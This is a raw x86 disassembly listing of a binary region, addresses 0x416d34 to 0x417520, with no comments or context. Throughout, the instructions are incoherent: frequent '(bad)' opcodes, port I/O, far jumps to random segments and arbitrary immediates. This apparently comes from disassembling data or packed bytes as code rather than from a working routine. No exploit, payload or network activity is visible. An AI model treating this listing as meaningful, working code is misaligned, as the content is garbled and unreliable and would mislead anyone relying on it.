  416d34:	add    DWORD PTR ds:0xf9f6ac4c,edx
  416d3a:	out    dx,eax
  416d3b:	cmp    ch,BYTE PTR ds:0xd150ea8a
  416d41:	data16 adc al,0x3d
  416d44:	outs   dx,BYTE PTR ds:[esi]
  416d45:	jmp    0x416d7e
  416d47:	mov    esi,0x79b778ee
  416d4c:	mov    esi,cs
  416d4e:	test   BYTE PTR [edi-0x34],cl
  416d51:	retf   0x1c17
  416d54:	mov    ebp,0x4e9ee921
  416d59:	mov    esp,0x1dddf166
  416d5e:	sbb    al,0x47
  416d60:	push   eax
  416d61:	out    dx,al
  416d62:	xor    BYTE PTR [ebp+0x5],cl
  416d65:	or     BYTE PTR [edx+ebx*4+0x63],ah
  416d69:	cli    
  416d6a:	pop    ecx
  416d6b:	sbb    BYTE PTR [ecx+0x2d720d54],cl
  416d71:	push   edx
  416d72:	fwait
  416d73:	loope  0x416da2
  416d75:	cmp    bl,BYTE PTR [edx+edi*2+0x5ee10922]
  416d7c:	mov    dl,0xd0
  416d7e:	cs push cs
  416d80:	xlat   BYTE PTR ds:[ebx]
  416d81:	sar    BYTE PTR [ecx+0x474699a1],1
  416d87:	xchg   esi,eax
  416d88:	outs   dx,DWORD PTR ds:[esi]
  416d89:	repz pop ebx
  416d8b:	mov    esp,0xff98ad52
  416d90:	(bad)  
  416d91:	push   ebp
  416d92:	mov    cl,0x95
  416d94:	jo     0x416e09
  416d96:	jecxz  0x416dad
  416d98:	adc    al,0x2a
  416d9a:	and    eax,edi
  416d9c:	xor    DWORD PTR [ecx-0x59],eax
  416d9f:	mov    ecx,0x7a4ebc43
  416da4:	push   ds
  416da5:	xor    DWORD PTR [eax-0x3336b888],0xffffff9a
  416dac:	xor    esi,DWORD PTR [edx]
  416dae:	cld    
  416daf:	repz ficomp WORD PTR [edx-0x6d3544ec]
  416db6:	fsubr  DWORD PTR [ebx+ebp*2]
  416db9:	xor    bl,BYTE PTR [edx-0x361ea97d]
  416dbf:	retf   0x733
  416dc2:	(bad)  
  416dc3:	test   si,di
  416dc6:	cs mov esp,0x4e5bc211
  416dcc:	stos   DWORD PTR es:[edi],eax
  416dcd:	fcomp  QWORD PTR [edx-0x77bb2909]
  416dd3:	inc    esp
  416dd4:	or     bl,BYTE PTR [ebx-0x25]
  416dd7:	imul   ebp,DWORD PTR [ecx+0x2d],0x53
  416ddb:	xchg   bh,dh
  416ddd:	cmp    ebp,DWORD PTR [edi-0x643bc060]
  416de3:	aas    
  416de4:	ins    DWORD PTR es:[edi],dx
  416de5:	push   eax
  416de6:	add    BYTE PTR [edx-0x9d062d2],dl
  416dec:	sahf   
  416ded:	inc    ebx
  416dee:	nop
  416def:	inc    edi
  416df0:	inc    ecx
  416df1:	adc    DWORD PTR [ebp-0x1a76340c],0xffffffd0
  416df8:	cmp    eax,0x98acabea
  416dfd:	rol    BYTE PTR [edi+ecx*4+0x6],0xdf
  416e02:	inc    edi
  416e03:	and    eax,0x19ad4b7f
  416e08:	mov    ch,0x2
  416e0a:	mov    edx,0xaa9c8b85
  416e0f:	lods   al,BYTE PTR ds:[esi]
  416e10:	dec    eax
  416e11:	mov    ecx,0xf6efd1
  416e16:	sbb    dh,BYTE PTR [ebx]
  416e18:	jp     0x416e13
  416e1a:	jbe    0x416e34
  416e1c:	sti    
  416e1d:	jecxz  0x416db4
  416e1f:	mov    ebp,0xe78e3be7
  416e24:	sbb    dl,al
  416e26:	shl    BYTE PTR [esi+0x42f8e1a9],cl
  416e2c:	pop    edx
  416e2d:	inc    esp
  416e2e:	(bad)  
  416e2f:	and    al,BYTE PTR [esi+0xd]
  416e32:	pushf  
  416e33:	int3   
  416e34:	imul   ebx,esi,0x5c82905
  416e3a:	jmp    0x1e4:0xc9dedb21
  416e41:	fisttp WORD PTR [eax-0x5f]
  416e44:	xchg   esp,eax
  416e45:	les    edx,FWORD PTR [edi]
  416e47:	data16 jne 0x416dfa
  416e4a:	and    al,0x7f
  416e4c:	imul   eax,eax,0x664a79c9
  416e52:	push   ecx
  416e53:	jae    0x416dec
  416e55:	push   es
  416e56:	add    DWORD PTR [eax],edx
  416e58:	int    0x7c
  416e5a:	push   0x97dbb3de
  416e5f:	add    DWORD PTR [eax-0x4ca3c59],0x4350289d
  416e69:	data16 or BYTE PTR [ecx-0x73],al
  416e6d:	cmc    
  416e6e:	adc    BYTE PTR ds:0xdb28,dl
  416e73:	rcl    BYTE PTR [edi-0x79],1
  416e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e77:	int    0xed
  416e79:	sub    cl,BYTE PTR ds:0x57ecb9ba
  416e7f:	ds inc edi
  416e81:	sub    BYTE PTR ds:0x2a67b131,dh
  416e87:	xchg   ebp,eax
  416e88:	sub    ah,dh
  416e8a:	neg    edx
  416e8c:	mov    ds:0x17c93bb4,eax
  416e91:	pushf  
  416e92:	or     DWORD PTR [edx-0x7d],0xe8dababa
  416e99:	dec    ebx
  416e9a:	dec    esi
  416e9b:	test   BYTE PTR [edi],dl
  416e9d:	or     al,0xca
  416e9f:	(bad)
  416ea3:	repnz xchg ebx,eax
  416ea5:	stos   DWORD PTR es:[edi],eax
  416ea6:	stos   BYTE PTR es:[edi],al
  416ea7:	call   0x3df0:0xd1a52827
  416eae:	int    0x91
  416eb0:	pop    ecx
  416eb1:	lods   eax,DWORD PTR ds:[esi]
  416eb2:	push   esi
  416eb3:	rcr    DWORD PTR [eax+0x7e90ee73],1
  416eb9:	lods   eax,DWORD PTR ds:[esi]
  416eba:	mov    bx,0x4307
  416ebe:	fwait
  416ebf:	arpl   WORD PTR [edi-0x2e],sp
  416ec2:	cdq    
  416ec3:	mov    ah,BYTE PTR [esi+ecx*8+0x1f]
  416ec7:	aad    0x9
  416ec9:	jg     0x416f43
  416ecb:	jmp    0xaceb:0xda9a5a9
  416ed2:	cmp    al,0x97
  416ed4:	jmp    DWORD PTR [eax]
  416ed6:	test   DWORD PTR [ebx+0x55],esi
  416ed9:	pusha  
  416eda:	push   ss
  416edb:	dec    BYTE PTR [ebp+0x313ba110]
  416ee1:	add    bh,BYTE PTR [edx-0x4d]
  416ee4:	dec    eax
  416ee5:	cdq    
  416ee6:	mov    esp,0xc2a1c61c
  416eeb:	aaa    
  416eec:	jmp    0x9460:0x9637841a
  416ef3:	dec    esp
  416ef4:	mov    bl,0xdf
  416ef6:	xor    ebp,DWORD PTR [ebp-0x19700204]
  416efc:	cmp    eax,edx
  416efe:	push   eax
  416eff:	dec    esp
  416f00:	mov    ss,WORD PTR [ebx+0x28]
  416f03:	and    al,dl
  416f05:	add    dh,BYTE PTR [eax+0x37]
  416f08:	inc    esp
  416f09:	push   esi
  416f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f0b:	sub    eax,0x8daf1446
  416f10:	imul   ecx,DWORD PTR [eax+0x4e],0x52
  416f14:	push   ecx
  416f15:	ins    DWORD PTR es:[edi],dx
  416f16:	cs retf 
  416f18:	and    DWORD PTR [edx-0xedbc2e1],ecx
  416f1e:	adc    BYTE PTR [edx+0x9],ch
  416f21:	out    0xf5,al
  416f23:	push   cs
  416f24:	pop    ss
  416f25:	fwait
  416f26:	ja     0x416ee7
  416f28:	cmp    cl,BYTE PTR [si]
  416f2b:	push   0xffffff8a
  416f2d:	xor    al,0xc1
  416f2f:	fwait
  416f30:	das    
  416f31:	jne    0x416f46
  416f33:	ins    DWORD PTR es:[edi],dx
  416f34:	or     ah,dh
  416f36:	dec    esi
  416f37:	(bad)  
  416f38:	cs popf 
  416f3a:	xchg   ebx,eax
  416f3b:	call   0x3e558b3d
  416f40:	test   eax,0xc66c350f
  416f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f46:	bound  ebx,QWORD PTR [esi+0x49775128]
  416f4c:	cmp    ecx,DWORD PTR ds:0xbc0dfa64
  416f52:	pop    ebp
  416f53:	retf   
  416f54:	pop    ecx
  416f55:	push   edi
  416f56:	add    dh,al
  416f58:	sub    eax,0x92d38f1a
  416f5d:	jns    0x416f81
  416f5f:	lea    ebp,[ebx]
  416f61:	lods   eax,DWORD PTR ds:[esi]
  416f62:	mov    cl,0xe8
  416f64:	dec    esi
  416f65:	jbe    0x416f1c
  416f67:	sahf   
  416f68:	sbb    ecx,DWORD PTR [edi-0x2c]
  416f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f6c:	dec    esi
  416f6d:	jo     0x416fd2
  416f6f:	fsub   DWORD PTR [ecx]
  416f71:	add    al,0xaf
  416f73:	mov    bl,0xb1
  416f75:	inc    ebx
  416f76:	leave  
  416f77:	or     ebp,esi
  416f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f7a:	and    DWORD PTR [edx-0x69536942],0x8e0f5a7e
  416f84:	mov    al,0xbf
  416f86:	jbe    0x416fb2
  416f88:	xchg   edi,eax
  416f89:	mov    ebp,0x8acf0982
  416f8e:	es add edi,edi
  416f91:	popf   
  416f92:	idiv   DWORD PTR [edi+esi*2]
  416f95:	and    bh,BYTE PTR [eax-0x7e]
  416f98:	inc    ebp
  416f99:	mov    al,0x83
  416f9b:	fwait
  416f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f9d:	jp     0x416fe8
  416f9f:	nop
  416fa0:	xchg   eax,edx
  416fa2:	mov    ds:0xd4660b59,al
  416fa7:	daa    
  416fa8:	imul   ecx,edx,0xffffff9a
  416fab:	mov    edx,0x59bd9355
  416fb0:	dec    ebp
  416fb1:	es jns 0x416f4b
  416fb4:	push   ecx
  416fb5:	dec    edx
  416fb6:	loope  0x416fed
  416fb8:	adc    ah,BYTE PTR [ebp+0x71]
  416fbb:	pop    ebx
  416fbc:	adc    esp,DWORD PTR [eax-0x666d56a6]
  416fc2:	adc    ah,BYTE PTR [edi+0x7f0542ea]
  416fc8:	add    ah,ch
  416fca:	push   ds
  416fcb:	mov    edi,0xcad9e02e
  416fd0:	mov    ah,0x5f
  416fd2:	cdq    
  416fd3:	repz cmp dh,dh
  416fd6:	stos   BYTE PTR es:[edi],al
  416fd7:	out    0x48,eax
  416fd9:	dec    eax
  416fda:	push   es
  416fdb:	jmp    0x8db3081a
  416fe0:	inc    BYTE PTR [edx-0x2]
  416fe3:	xchg   edx,eax
  416fe4:	cmp    al,0x9c
  416fe6:	les    edx,FWORD PTR [ebx+edi*2-0x2a04d6a7]
  416fed:	js     0x416fea
  416fef:	push   ebp
  416ff0:	hlt    
  416ff1:	inc    ecx
  416ff2:	enter  0x1875,0x10
  416ff6:	push   cs
  416ff7:	aad    0x94
  416ff9:	mov    eax,0x715dd933
  416ffe:	imul   edi,DWORD PTR [ebx+0x65],0xffffffaf
  417002:	push   es
  417003:	dec    ebp
  417004:	xchg   ebx,eax
  417005:	fnstenv [ecx+0x13]
  417008:	sbb    al,0x3a
  41700a:	or     eax,0x13c17b41
  41700f:	mov    WORD PTR [esi],gs
  417011:	push   edi
  417012:	rcl    DWORD PTR [edx],1
  417014:	push   cs
  417015:	rcr    DWORD PTR [edi+0x33],1
  417018:	or     eax,0xc7f1e05a
  41701d:	xchg   esp,eax
  41701e:	and    al,0x43
  417020:	(bad)  
  417021:	dec    ebx
  417022:	int3   
  417023:	mov    ecx,0x53ca0557
  417028:	call   0xfeff:0xf720a49a
  41702f:	jne    0x416fee
  417031:	fisttp QWORD PTR [ebp+0x4bf7b65a]
  417037:	xor    al,0x74
  417039:	cmp    al,BYTE PTR [ebp-0x45]
  41703c:	cmp    DWORD PTR [ebx-0x56],ebx
  41703f:	xchg   edx,eax
  417040:	cmp    eax,0xa2b32ab9
  417045:	mov    al,0xb4
  417047:	mov    BYTE PTR [edx+0x7e53ce76],ch
  41704d:	imul   ebp,DWORD PTR [edi],0xffffffba
  417050:	push   0xe52307df
  417055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417056:	xchg   esp,eax
  417057:	ins    BYTE PTR es:[edi],dx
  417058:	and    bh,BYTE PTR [ecx]
  41705a:	stos   BYTE PTR es:[edi],al
  41705b:	xor    al,0xfb
  41705d:	push   ds
  41705e:	push   0xffffffb5
  417060:	aaa    
  417061:	jecxz  0x41705c
  417063:	je     0x4170aa
  417065:	fcomip st,st(4)
  417067:	pop    ds
  417068:	(bad)  
  417069:	xor    DWORD PTR [ecx+0x22fc1ac0],ecx
  41706f:	jge    0x417028
  417071:	mov    edi,0xaaf9bb40
  417076:	sahf   
  417077:	sbb    BYTE PTR [ebx+0xc6e9727],0xc3
  41707e:	shr    bh,0x4
  417081:	loope  0x41701e
  417083:	fist   WORD PTR [eax]
  417085:	xchg   esi,eax
  417086:	jge    0x4170b8
  417088:	out    0x37,eax
  41708a:	push   es
  41708b:	(bad)  
  41708c:	sub    ebx,DWORD PTR [edi-0x3]
  41708f:	je     0x417105
  417091:	add    BYTE PTR [eax],al
  417093:	xor    cl,BYTE PTR [ebp-0x7f]
  417096:	sub    ah,BYTE PTR [edx+0x28]
  417099:	mov    ebp,DWORD PTR [edi+eax*8]
  41709c:	jp     0x417094
  41709e:	imul   esp,ecx,0xffffffe1
  4170a1:	test   BYTE PTR [edx+0x58c504e2],bh
  4170a7:	jle    0x417084
  4170a9:	sbb    edx,eax
  4170ab:	je     0x417110
  4170ad:	xchg   esi,eax
  4170ae:	cdq    
  4170af:	push   esi
  4170b0:	add    ecx,DWORD PTR [ecx]
  4170b2:	push   eax
  4170b3:	push   es
  4170b4:	jmp    0xdb7f923d
  4170b9:	fmul   QWORD PTR [ebx+0x5e]
  4170bc:	daa    
  4170bd:	inc    ecx
  4170be:	(bad)  
  4170bf:	and    BYTE PTR [ecx-0x2b2b8a1a],bh
  4170c5:	sub    DWORD PTR [eax-0x4f2b3f66],esp
  4170cb:	jecxz  0x417079
  4170cd:	cdq    
  4170ce:	pop    esp
  4170cf:	xchg   edx,eax
  4170d0:	les    esp,FWORD PTR [edx-0x73]
  4170d3:	repnz popf 
  4170d5:	fistp  QWORD PTR [ecx+0x31530d6e]
  4170db:	sbb    esi,DWORD PTR [eax+0x26587435]
  4170e1:	push   edx
  4170e2:	jl     0x4170e1
  4170e4:	and    al,0x2f
  4170e6:	data16 jge 0x4170c0
  4170e9:	cmc    
  4170ea:	jmp    0x8c83:0x67328e47
  4170f1:	int3   
  4170f2:	aas    
  4170f3:	add    BYTE PTR [di-0x44],0xb6
  4170f8:	inc    esp
  4170f9:	add    dh,ah
  4170fb:	in     eax,dx
  4170fc:	xchg   esp,eax
  4170fd:	jl     0x4170db
  4170ff:	icebp  
  417100:	sub    BYTE PTR [edx],0xe6
  417103:	xor    BYTE PTR [edi],ah
  417105:	dec    ecx
  417106:	call   0x4738ac1a
  41710b:	or     eax,0x6eae7f2f
  417110:	inc    DWORD PTR [eax+0x2d9d17e4]
  417116:	(bad)  [ebp-0x2d]
  417119:	add    al,0x3f
  41711b:	add    edx,DWORD PTR [ecx-0x2e350dfd]
  417121:	add    al,BYTE PTR [eax-0x79]
  417124:	iret   
  417125:	(bad)  [esp+eax*4-0x6a]
  417129:	stc    
  41712a:	(bad)  
  41712c:	imul   esp,esi
  41712f:	mov    WORD PTR [eax-0x7f],es
  417132:	out    0x65,eax
  417134:	scas   eax,DWORD PTR es:[edi]
  417135:	out    dx,al
  417136:	dec    ecx
  417137:	not    DWORD PTR [esi]
  417139:	inc    edx
  41713a:	cmp    DWORD PTR [ebx+0x7d],edx
  41713d:	jge    0x4170e6
  41713f:	js     0x41713c
  417141:	cmp    DWORD PTR [esi-0x22],ebp
  417144:	mov    DWORD PTR [eax+esi*4],edx
  417147:	jns    0x417135
  417149:	fsub   DWORD PTR [ebx+eax*2+0x3a770b00]
  417150:	mov    ecx,0x19b63c50
  417155:	jno    0x4170e9
  417157:	mov    cl,0x65
  417159:	and    DWORD PTR [eax],ebp
  41715b:	(bad)  
  41715c:	fistp  DWORD PTR [ebp-0x4a]
  41715f:	ror    DWORD PTR [esi+0x76e8e662],0xd3
  417166:	xchg   edx,eax
  417167:	cmp    eax,0x7917e68
  41716c:	mov    dh,0xba
  41716e:	clc    
  41716f:	push   ss
  417170:	(bad)  
  417171:	mov    fs,edx
  417173:	pop    esi
  417174:	push   ecx
  417175:	sbb    al,0x29
  417177:	xchg   edi,eax
  417178:	sub    edi,ecx
  41717a:	loopne 0x417183
  41717c:	xchg   BYTE PTR [eax],dh
  41717e:	(bad)  
  41717f:	lahf   
  417180:	jnp    0x417145
  417182:	aad    0x3e
  417184:	cmp    DWORD PTR [ecx+esi*8],0xa650a844
  41718b:	sbb    BYTE PTR [edx],cl
  41718d:	test   DWORD PTR [ecx],edx
  41718f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417190:	rcl    DWORD PTR [eax],1
  417192:	xlat   BYTE PTR ds:[ebx]
  417193:	call   FWORD PTR [esi]
  417195:	pop    edi
  417196:	ja     0x417137
  417198:	adc    bh,bh
  41719a:	adc    edi,DWORD PTR [ebx-0x3]
  41719d:	cmp    eax,0x41193fc4
  4171a2:	sbb    DWORD PTR [esi-0x15],eax
  4171a5:	sbb    al,0x35
  4171a7:	mov    dh,0x9a
  4171a9:	ficom  DWORD PTR [eax+0x49]
  4171ac:	pop    esp
  4171ad:	neg    ecx
  4171af:	popa   
  4171b0:	fadd   DWORD PTR [ebp+0x773b794c]
  4171b6:	imul   DWORD PTR [edi-0x18603d64]
  4171bc:	pop    es
  4171bd:	sbb    ebp,esi
  4171bf:	xchg   ebx,eax
  4171c0:	jae    0x417234
  4171c2:	fidivr WORD PTR [esi]
  4171c4:	gs (bad) 
  4171c7:	dec    edi
  4171c8:	add    bl,BYTE PTR [eax+ebp*2+0x42d4f110]
  4171cf:	inc    ebp
  4171d0:	xchg   ecx,eax
  4171d1:	in     eax,dx
  4171d2:	jae    0x417251
  4171d4:	in     eax,0x66
  4171d6:	xor    dl,bl
  4171d8:	add    al,dh
  4171da:	pop    ecx
  4171db:	outs   dx,BYTE PTR ds:[esi]
  4171dc:	pusha  
  4171dd:	leave  
  4171de:	xor    edx,ecx
  4171e0:	mov    ah,0xf1
  4171e2:	sub    ah,0xba
  4171e5:	retf   0xfa77
  4171e8:	jle    0x417238
  4171ea:	out    dx,eax
  4171eb:	cmp    BYTE PTR [esi],0x85
  4171ee:	mov    ds:0xf41be06,al
  4171f3:	xor    eax,0x2674f09c
  4171f8:	push   ss
  4171f9:	add    al,0xe4
  4171fb:	sar    BYTE PTR [ecx],1
  4171fd:	pop    ss
  4171fe:	mov    edx,0xd0a50523
  417203:	push   edi
  417204:	push   0x9fa26098
  417209:	dec    esi
  41720a:	or     esp,DWORD PTR [eax-0x2f34eb0a]
  417210:	pop    ebx
  417211:	inc    eax
  417212:	call   0xaaf4:0x15df4c8e
  417219:	rcr    BYTE PTR [ebp-0x1e],0x9e
  41721d:	dec    eax
  41721e:	dec    eax
  41721f:	pusha  
  417220:	cmp    ah,al
  417222:	cmp    edx,DWORD PTR [edi+0x28]
  417225:	add    DWORD PTR [ebx-0x46a0f18],0x68
  41722c:	push   ss
  41722d:	push   edx
  41722e:	or     ch,BYTE PTR [edi-0x3f]
  417231:	or     ebp,DWORD PTR [ebx-0x1579d577]
  417237:	lock adc edx,DWORD PTR [ecx]
  41723a:	xchg   DWORD PTR [edi+0x360d9fbf],eax
  417240:	int    0x8a
  417242:	(bad)  
  417243:	cmp    dl,al
  417245:	mov    bh,BYTE PTR [eax*4-0x33e8043e]
  41724c:	dec    ebp
  41724d:	sbb    eax,ecx
  41724f:	sub    dl,BYTE PTR [edx]
  417251:	adc    ecx,edi
  417253:	hlt    
  417254:	xchg   ecx,eax
  417255:	inc    eax
  417256:	add    al,0x24
  417258:	pop    ecx
  417259:	aaa    
  41725a:	and    DWORD PTR [esi],edx
  41725c:	mov    edi,0xafd3293e
  417261:	pop    esi
  417262:	test   esi,0x76f0a83d
  417268:	pop    esp
  417269:	dec    edx
  41726a:	cmp    BYTE PTR [esp+edi*4-0x4446d68b],bh
  417271:	ins    DWORD PTR es:[edi],dx
  417272:	enter  0x922c,0x2
  417276:	test   BYTE PTR [ebx-0x71575171],bh
  41727c:	fsub   QWORD PTR [edi+0x51c04ad3]
  417282:	icebp  
  417283:	mov    DWORD PTR [ecx+0x5e0baa21],ebp
  417289:	out    dx,eax
  41728a:	enter  0x836,0x6c
  41728e:	pop    ds
  41728f:	fsub   DWORD PTR [ebp-0x533d430c]
  417295:	aaa    
  417296:	jp     0x417222
  417298:	std    
  417299:	fst    QWORD PTR [eax+0x34558938]
  41729f:	mov    dh,0x49
  4172a1:	mov    ds:0xe1b3acff,eax
  4172a6:	add    al,0xb8
  4172a8:	(bad)
  4172ab:	fldenv ds:0xe9f01fc2
  4172b1:	pop    esi
  4172b2:	jno    0x41731d
  4172b4:	int    0xc3
  4172b6:	or     eax,0xfaa29fff
  4172bb:	ss mov eax,0x80d8e1e5
  4172c1:	mov    bl,0xe1
  4172c3:	mov    eax,0x905d5bc5
  4172c8:	pop    esi
  4172c9:	mov    ecx,0x29b1a640
  4172ce:	rol    BYTE PTR [ecx+0x3b],0xf7
  4172d2:	idiv   ebp
  4172d4:	mov    WORD PTR ds:0x21cde74,cs
  4172da:	or     ebx,DWORD PTR [edx-0x32bbede7]
  4172e0:	jle    0x4172d4
  4172e2:	call   0xd739419a
  4172e7:	add    eax,0xb90c01c5
  4172ec:	xor    ebx,DWORD PTR [edx+0x3b]
  4172ef:	and    ecx,DWORD PTR [ebp-0x4e]
  4172f2:	add    DWORD PTR [ebx],ebp
  4172f4:	pop    ebx
  4172f5:	dec    ecx
  4172f6:	and    ch,BYTE PTR [eax-0x3a21086e]
  4172fc:	or     BYTE PTR [eax+0x45],bh
  4172ff:	xor    BYTE PTR [ebp+0x4d],dl
  417302:	or     ch,BYTE PTR [ebp+0x3e]
  417305:	cwde   
  417306:	js     0x417383
  417308:	es maxsd xmm4,xmm1
  41730d:	test   BYTE PTR [ecx+0x14],bl
  417310:	rcr    BYTE PTR [eax+0x437ed22],1
  417316:	fs jl  0x4172f6
  417319:	aaa    
  41731a:	inc    esi
  41731b:	scas   al,BYTE PTR es:[edi]
  41731c:	dec    ebp
  41731d:	shr    DWORD PTR [edx+0x6b],1
  417320:	(bad)
  417324:	(bad)  
  417325:	nop
  417326:	stos   BYTE PTR es:[edi],al
  417327:	hlt    
  417328:	lds    esp,FWORD PTR [bp+di-0x63]
  41732c:	inc    eax
  41732d:	adc    eax,0x34ed2392
  417332:	cmp    eax,0xfbd43037
  417337:	or     BYTE PTR [ebp-0x5ef37dda],ah
  41733d:	dec    eax
  41733e:	iret   
  41733f:	js     0x417348
  417341:	jp     0x41733f
  417343:	test   al,0xf8
  417345:	shr    BYTE PTR [esi-0x2437280],0xc3
  41734c:	gs adc eax,0x7c7ada7f
  417352:	mov    bl,0x48
  417354:	test   bh,ah
  417356:	push   es
  417357:	test   BYTE PTR [esi+0x194c2d16],ah
  41735d:	jp     0x417397
  41735f:	cmp    eax,0xbf509eb
  417364:	and    ecx,DWORD PTR ds:0xf51d8050
  41736a:	sar    ebp,0x6e
  41736d:	rcr    BYTE PTR [edx+0x49],1
  417370:	aaa    
  417371:	add    bh,dl
  417373:	mul    DWORD PTR [eax-0x7d]
  417376:	(bad)  [ecx+ebp*2]
  417379:	inc    edx
  41737a:	(bad)  
  41737b:	fmul   QWORD PTR [esi]
  41737d:	jecxz  0x4173e6
  41737f:	jl     0x417369
  417381:	cli    
  417382:	in     al,dx
  417383:	gs xor eax,0x922917af
  417389:	mov    ch,0xa
  41738b:	adc    eax,0x7224415f
  417390:	out    0x65,eax
  417392:	pop    edi
  417393:	and    bh,bh
  417395:	pushf  
  417396:	cli    
  417397:	jmp    0x417346
  417399:	icebp  
  41739a:	xchg   BYTE PTR [edx],dh
  41739c:	jns    0x417351
  41739e:	push   ecx
  41739f:	pop    ds
  4173a0:	aam    0xbb
  4173a2:	mov    ah,0x1e
  4173a4:	mov    esi,0xcb3940e1
  4173a9:	sub    BYTE PTR [edi+ebx*2+0x2903e754],0x9c
  4173b1:	popa   
  4173b2:	ds and al,al
  4173b5:	cdq    
  4173b6:	arpl   si,sp
  4173b8:	mov    al,ds:0xf365b13c
  4173bd:	push   ebx
  4173be:	cmp    al,bh
  4173c0:	enter  0xba8d,0x18
  4173c4:	inc    ebp
  4173c5:	lds    ebx,FWORD PTR [ebx-0x732e98d5]
  4173cb:	dec    ecx
  4173cc:	lahf   
  4173cd:	repz jno 0x41738b
  4173d0:	jns    0x417389
  4173d2:	stos   DWORD PTR es:[edi],eax
  4173d3:	mov    BYTE PTR [ebx-0x1a8e3e60],al
  4173d9:	or     BYTE PTR [ecx+0xc],bh
  4173dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173dd:	popa   
  4173de:	mov    al,ds:0x26a341d2
  4173e3:	leave  
  4173e4:	shr    DWORD PTR [esi],cl
  4173e6:	retf   
  4173e7:	and    BYTE PTR [eax+edi*2],ah
  4173ea:	call   0xa878:0xba6fb309
  4173f1:	sti    
  4173f2:	lods   eax,DWORD PTR ds:[esi]
  4173f3:	outs   dx,BYTE PTR ds:[esi]
  4173f4:	test   eax,0xd39c8f6b
  4173f9:	js     0x4173aa
  4173fb:	pop    esp
  4173fc:	or     ah,ah
  4173fe:	popa   
  4173ff:	mov    al,0x9f
  417401:	gs xchg dl,cl
  417404:	iret   
  417405:	pushw  0xb69f
  417409:	gs dec ebp
  41740b:	rcr    ah,1
  41740d:	dec    BYTE PTR ds:0x2a292f16
  417413:	add    dl,BYTE PTR [ecx+0x36fc933d]
  417419:	test   BYTE PTR [edi-0x12],dh
  41741c:	sub    eax,DWORD PTR ds:0x857f5536
  417422:	inc    ebp
  417423:	and    BYTE PTR [ecx+0x8aa7c91],dh
  417429:	out    dx,eax
  41742a:	stos   DWORD PTR es:[edi],eax
  41742b:	retf   0xaa60
  41742e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41742f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417430:	xor    BYTE PTR [esi+0x38],ch
  417433:	test   eax,0xc981e16a
  417438:	outs   dx,DWORD PTR ds:[esi]
  417439:	icebp  
  41743a:	lods   eax,DWORD PTR ds:[esi]
  41743b:	dec    cx
  41743d:	addr16 inc esi
  41743f:	pop    ds
  417440:	xchg   ecx,eax
  417441:	push   edx
  417442:	push   cs
  417443:	xor    ebx,ebp
  417445:	pop    ss
  417446:	loop   0x4173eb
  417448:	xchg   edi,eax
  417449:	inc    ebp
  41744a:	pop    es
  41744b:	and    al,0x91
  41744d:	in     al,dx
  41744e:	xchg   esi,eax
  41744f:	gs dec edi
  417451:	repz mov ds:0x63b97258,eax
  417457:	je     0x417421
  417459:	mov    eax,0x1085e639
  41745e:	mov    ebp,0xa42b7396
  417463:	mov    ecx,0x9f68c5e5
  417468:	in     eax,dx
  417469:	xor    eax,0xe7f6e241
  41746e:	les    edi,FWORD PTR [ebp-0x15]
  417471:	xor    eax,0x475f7348
  417476:	cmp    DWORD PTR [edi],edi
  417478:	idiv   ah
  41747a:	in     eax,0x27
  41747c:	jnp    0x41742a
  41747e:	hlt    
  41747f:	(bad)  
  417480:	iret   
  417481:	add    al,BYTE PTR [edx+0xa]
  417484:	push   0x11125ff8
  417489:	popa   
  41748a:	loopne 0x417427
  41748c:	xchg   esp,eax
  41748d:	pop    ebx
  41748e:	add    al,0xf1
  417490:	add    al,0x56
  417492:	jp     0x417416
  417494:	sub    eax,0xe19671b
  417499:	push   eax
  41749a:	into   
  41749b:	push   eax
  41749c:	and    eax,DWORD PTR [ecx-0x2a72009e]
  4174a2:	call   0x83ca54ff
  4174a7:	and    esp,DWORD PTR ds:0x3610d75a
  4174ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ae:	add    ebp,edx
  4174b0:	add    al,0x2
  4174b2:	dec    ebx
  4174b3:	pop    ebp
  4174b4:	dec    esp
  4174b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b6:	popa   
  4174b7:	retf   
  4174b8:	dec    ecx
  4174b9:	xlat   BYTE PTR ds:[ebx]
  4174ba:	fwait
  4174bb:	stos   DWORD PTR es:[edi],eax
  4174bc:	es sti 
  4174be:	mov    esi,0x926155ae
  4174c3:	xor    edx,edi
  4174c5:	sbb    dh,BYTE PTR [edx-0x43]
  4174c8:	mov    ebp,gs
  4174ca:	mov    WORD PTR [edx+0x770052fc],?
  4174d0:	jae    0x417460
  4174d2:	push   ebx
  4174d3:	std    
  4174d4:	out    0x28,al
  4174d6:	dec    esi
  4174d7:	jge    0x4174fb
  4174d9:	sbb    BYTE PTR [edi-0x7efac026],ah
  4174df:	add    esi,esp
  4174e1:	inc    ebp
  4174e2:	icebp  
  4174e3:	pop    ds
  4174e4:	sub    DWORD PTR [ecx-0x33fd0866],0x49
  4174eb:	inc    eax
  4174ec:	push   esi
  4174ed:	pop    edx
  4174ee:	mov    BYTE PTR [edx-0x34c75123],0x3a
  4174f5:	stos   DWORD PTR es:[edi],eax
  4174f6:	push   ss
  4174f7:	fisttp QWORD PTR [edx+0x71fbd250]
  4174fd:	add    edi,DWORD PTR [edx-0x17]
  417500:	retf   0x9d9c
  417503:	xor    BYTE PTR [ebx],0xe7
  417506:	or     al,0x8c
  417508:	outs   dx,BYTE PTR ds:[esi]
  417509:	rcr    BYTE PTR [edi-0x76],cl
  41750c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750d:	gs (bad) 
  41750f:	int    0x1a
  417511:	outs   dx,BYTE PTR ds:[esi]
  417512:	aad    0xa7
  417514:	jb     0x417594
  417516:	cmp    eax,0x1f1332a3
  41751b:	fiadd  DWORD PTR [edi+0x67]
  41751e:	shl    esp,1
  417520:	lahf   
